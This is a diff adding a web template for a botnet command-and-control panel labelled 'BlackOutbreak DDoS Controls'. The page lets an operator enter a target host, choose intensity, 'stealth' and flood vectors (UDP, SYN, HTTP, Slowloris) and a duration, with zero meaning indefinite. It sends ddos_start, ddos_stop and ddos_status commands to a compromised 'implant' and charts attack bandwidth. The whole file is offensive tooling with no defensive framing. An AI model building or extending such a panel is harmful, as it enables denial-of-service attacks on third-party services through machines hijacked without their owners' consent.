@@ -1,0 +1,335 @@
+{% extends "implant_detail.html" %}
+
+{% block implant_specific %}
+<div class="card bg-dark-subtle mb-4">
+    <div class="card-header bg-danger text-white">
+        <h5 class="mb-0">
+            <i class="fas fa-network-wired me-2"></i> BlackOutbreak DDoS Controls
+        </h5>
+    </div>
+    <div class="card-body">
+        <!-- Attack Launcher -->
+        <div class="row mb-4">
+            <div class="col-md-12">
+                <h6>Launch Attack</h6>
+                <div class="input-group mb-2">
+                    <input type="text" class="form-control" id="targetInput" placeholder="Target (e.g. example.com:80)">
+                    <select class="form-select" id="intensitySelect">
+                        <option value="" disabled>Intensity</option>
+                        {% for i in range(1, 11) %}
+                        <option value="{{ i }}" {% if i == 5 %}selected{% endif %}>{{ i }}/10</option>
+                        {% endfor %}
+                    </select>
+                    <select class="form-select" id="stealthSelect">
+                        <option value="" disabled>Stealth</option>
+                        {% for i in range(1, 11) %}
+                        <option value="{{ i }}" {% if i == 7 %}selected{% endif %}>{{ i }}/10</option>
+                        {% endfor %}
+                    </select>
+                    <button class="btn btn-danger" id="launchAttackBtn">Launch</button>
+                </div>
+                <div class="form-check form-check-inline mt-2">
+                    <input class="form-check-input" type="checkbox" id="vectorUdp" value="udp" checked>
+                    <label class="form-check-label" for="vectorUdp">UDP Flood</label>
+                </div>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="checkbox" id="vectorSyn" value="syn" checked>
+                    <label class="form-check-label" for="vectorSyn">SYN Flood</label>
+                </div>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="checkbox" id="vectorHttp" value="http" checked>
+                    <label class="form-check-label" for="vectorHttp">HTTP Flood</label>
+                </div>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="checkbox" id="vectorSlowloris" value="slowloris">
+                    <label class="form-check-label" for="vectorSlowloris">Slowloris</label>
+                </div>
+                <div class="mt-2">
+                    <label for="durationInput" class="form-label">Duration (seconds, 0 = indefinite)</label>
+                    <input type="number" class="form-control" id="durationInput" value="300" min="0">
+                </div>
+            </div>
+        </div>
+
+        <!-- Active Attacks -->
+        <div class="row">
+            <div class="col-md-12">
+                <h6>Active Attacks</h6>
+                <div class="table-responsive">
+                    <table class="table table-dark table-sm" id="activeAttacksTable">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Target</th>
+                                <th>Vectors</th>
+                                <th>Bandwidth</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td colspan="5" class="text-center">No active attacks</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Attack Traffic Chart -->
+        <div class="row mt-4">
+            <div class="col-md-12">
+                <h6>Attack Traffic</h6>
+                <canvas id="trafficChart" style="width:100%; height:250px;"></canvas>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+{{ super() }}
+<script>
+    $(document).ready(function() {
+        const implantId = "{{ implant.id }}";
+        let attackTrafficChart = null;
+        let attackDataPoints = [];
+        
+        // Initialize chart
+        const ctx = document.getElementById('trafficChart').getContext('2d');
+        attackTrafficChart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: [],
+                datasets: [{
+                    label: 'Bandwidth (KB/s)',
+                    data: [],
+                    borderColor: 'rgba(255, 99, 132, 1)',
+                    backgroundColor: 'rgba(255, 99, 132, 0.2)',
+                    tension: 0.4
+                }]
+            },
+            options: {
+                responsive: true,
+                scales: {
+                    x: {
+                        grid: {
+                            color: 'rgba(255, 255, 255, 0.1)'
+                        },
+                        ticks: {
+                            color: 'rgba(255, 255, 255, 0.7)'
+                        }
+                    },
+                    y: {
+                        grid: {
+                            color: 'rgba(255, 255, 255, 0.1)'
+                        },
+                        ticks: {
+                            color: 'rgba(255, 255, 255, 0.7)'
+                        },
+                        beginAtZero: true
+                    }
+                },
+                plugins: {
+                    legend: {
+                        labels: {
+                            color: 'rgba(255, 255, 255, 0.7)'
+                        }
+                    }
+                }
+            }
+        });
+        
+        // Launch attack
+        $('#launchAttackBtn').on('click', function() {
+            const target = $('#targetInput').val();
+            const intensity = $('#intensitySelect').val();
+            const stealth = $('#stealthSelect').val();
+            const duration = $('#durationInput').val();
+            
+            // Get selected vectors
+            const vectors = [];
+            if ($('#vectorUdp').is(':checked')) vectors.push('udp');
+            if ($('#vectorSyn').is(':checked')) vectors.push('syn');
+            if ($('#vectorHttp').is(':checked')) vectors.push('http');
+            if ($('#vectorSlowloris').is(':checked')) vectors.push('slowloris');
+            
+            if (!target) {
+                alert('Please enter a target');
+                return;
+            }
+            
+            if (vectors.length === 0) {
+                alert('Please select at least one attack vector');
+                return;
+            }
+            
+            // Build command
+            const command = `ddos_start ${target} ${intensity} ${stealth} ${vectors.join(',')} ${duration}`;
+            
+            // Send command to implant
+            sendCommand(command);
+        });
+        
+        // Stop attack button handler (assigned dynamically)
+        $(document).on('click', '.stop-attack-btn', function() {
+            const attackId = $(this).data('attack-id');
+            sendCommand(`ddos_stop ${attackId}`);
+        });
+        
+        // Refresh attack status
+        function refreshAttackStatus() {
+            sendCommand('ddos_status', updateAttackTable);
+        }
+        
+        // Update attack table
+        function updateAttackTable(result) {
+            // Parse attack status from result
+            const attacks = parseAttackStatus(result);
+            const $table = $('#activeAttacksTable tbody');
+            
+            if (attacks.length === 0) {
+                $table.html('<tr><td colspan="5" class="text-center">No active attacks</td></tr>');
+                return;
+            }
+            
+            // Clear table
+            $table.empty();
+            
+            // Add rows for each attack
+            attacks.forEach(attack => {
+                const row = `
+                <tr>
+                    <td>${attack.id}</td>
+                    <td>${attack.target}</td>
+                    <td>${attack.vectors}</td>
+                    <td>${attack.bandwidth} KB/s</td>
+                    <td>
+                        <button class="btn btn-sm btn-danger stop-attack-btn" data-attack-id="${attack.id}">Stop</button>
+                    </td>
+                </tr>
+                `;
+                $table.append(row);
+                
+                // Update chart data
+                updateTrafficChart(attack);
+            });
+        }
+        
+        // Parse attack status from command result
+        function parseAttackStatus(result) {
+            const attacks = [];
+            
+            // If result contains "No active attacks"
+            if (result.includes("No active attacks")) {
+                return attacks;
+            }
+            
+            // Simple parsing of the text-based output
+            // This would need to be adapted based on actual output format
+            const lines = result.split('\n');
+            let currentAttack = null;
+            
+            for (let i = 0; i < lines.length; i++) {
+                const line = lines[i].trim();
+                
+                if (line.startsWith('ID:')) {
+                    if (currentAttack !== null) {
+                        attacks.push(currentAttack);
+                    }
+                    currentAttack = {
+                        id: line.substring(3).trim(),
+                        target: '',
+                        vectors: '',
+                        bandwidth: '0',
+                        packets: '0'
+                    };
+                } else if (currentAttack && line.startsWith('Target:')) {
+                    currentAttack.target = line.substring(7).trim();
+                } else if (currentAttack && line.startsWith('Vectors:')) {
+                    currentAttack.vectors = line.substring(8).trim();
+                } else if (currentAttack && line.startsWith('Data:')) {
+                    // Extract KB value from "Data: X.XX KB"
+                    const match = line.match(/Data: ([\d\.]+) KB/);
+                    if (match) currentAttack.bandwidth = match[1];
+                }
+            }
+            
+            // Add last attack
+            if (currentAttack !== null) {
+                attacks.push(currentAttack);
+            }
+            
+            return attacks;
+        }
+        
+        // Update traffic chart
+        function updateTrafficChart(attack) {
+            const now = new Date();
+            const timeLabel = now.getHours() + ':' + now.getMinutes() + ':' + now.getSeconds();
+            
+            // Add new data point
+            attackDataPoints.push({
+                time: timeLabel,
+                bandwidth: parseFloat(attack.bandwidth)
+            });
+            
+            // Keep only recent data points (last 30)
+            if (attackDataPoints.length > 30) {
+                attackDataPoints.shift();
+            }
+            
+            // Update chart
+            attackTrafficChart.data.labels = attackDataPoints.map(p => p.time);
+            attackTrafficChart.data.datasets[0].data = attackDataPoints.map(p => p.bandwidth);
+            attackTrafficChart.update();
+        }
+        
+        // Send command to implant
+        function sendCommand(command, callback) {
+            $.ajax({
+                url: '/api/send_command',
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({
+                    implant_id: implantId,
+                    command: command
+                }),
+                success: function(response) {
+                    console.log('Command sent:', response);
+                    // Wait for command response
+                    setTimeout(() => {
+                        getCommandResult(response.command_id, callback);
+                    }, 2000);
+                },
+                error: function(xhr) {
+                    console.error('Error sending command:', xhr.responseJSON);
+                }
+            });
+        }
+        
+        // Get command result
+        function getCommandResult(commandId, callback) {
+            $.ajax({
+                url: `/api/command_result/${commandId}`,
+                type: 'GET',
+                success: function(response) {
+                    if (response.result) {
+                        console.log('Command result:', response.result);
+                        if (callback) callback(response.result);
+                    }
+                },
+                error: function(xhr) {
+                    console.error('Error getting command result:', xhr.responseJSON);
+                }
+            });
+        }
+        
+        // Refresh status periodically
+        setInterval(refreshAttackStatus, 10000); // Every 10 seconds
+        
+        // Initial refresh
+        refreshAttackStatus();
+    });
+</script>
+{% endblock %}
